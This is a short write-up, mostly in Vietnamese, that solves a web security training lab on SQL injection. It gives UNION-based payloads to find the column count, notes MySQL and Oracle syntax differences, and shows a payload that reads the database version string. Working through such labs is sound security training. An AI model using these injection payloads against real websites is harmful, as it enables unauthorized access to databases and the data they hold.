# **Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**

>  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.  
 To solve the lab, display the database version string. 

 # **Solution**
 Nhìn vào tổng thể web mục tiêu ta thấy được nội dung response có chứa nội dung văn bản, mục tiêu là lấy thông tin về database của bài lab nên ta có thể thực hiện SQLi vào bộ lọc danh mục sản phẩm qua URL.

 ```
 https://0af70091035b0bbc80abb77f0085007d.web-security-academy.net/filter?category=Pets
 ```

Vẫn sẽ sử dụng phương pháp UNION:

 ```
' UNION SELECT NULL,NULL --
 ```

 **Chú ý**: Ở đây ta đã thử dò từ 1 đến số lượng cột là 5 mà vẫn báo lỗi thì có thể do các lí do sau đây:
 - Do cơ sở dữ liệu mục tiêu dùng có thể là MySql, khi comment bằng `--` cần khoảng trắng đi sau, nghĩa là: `-- `. Vì vậy nếu ta chỉ nhập đoạn mã của mình chèn trực tiếp vào URL thì khi thực hiện URL encode đoạn trắng phía sau cùng sẽ bị bỏ. Ta cần encode trước khi thêm vào URL. Nghĩa là:

 ```
 '+UNION+SELECT+NULL,NULL--+
 ```

 - Có thể cơ sở dữ liệu mục tiêu là Oracle. Khi đó trong mỗi câu truy vấn `SELECT` đều cần đi kèm `FROM`. Tức là khi đó câu truy vấn là:


 ```
 ' UNION SELECT NULL, NULL FROM DUAL --
 ```

Thử các cách trên ta xác đinh được cơ sở dữ liệu là MySQL (Cần khoảng trắng theo sau `--`). Và cũng xác định truy vấn có 2 cột kiểu dữ liệu chuỗi kí tự.

Tiếp theo đó là chèn thực hiện truy vấn lấy thông tin về database:

```
'+UNION+SELECT+NULL,@@version--+
```

Done!!

![image](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ09NovlF56wzX2HV9N8HSdjfQr_ikSWybukRRpF0Hz0FSVGjWk9Z8pogQjvFlB4D9om70&usqp=CAU)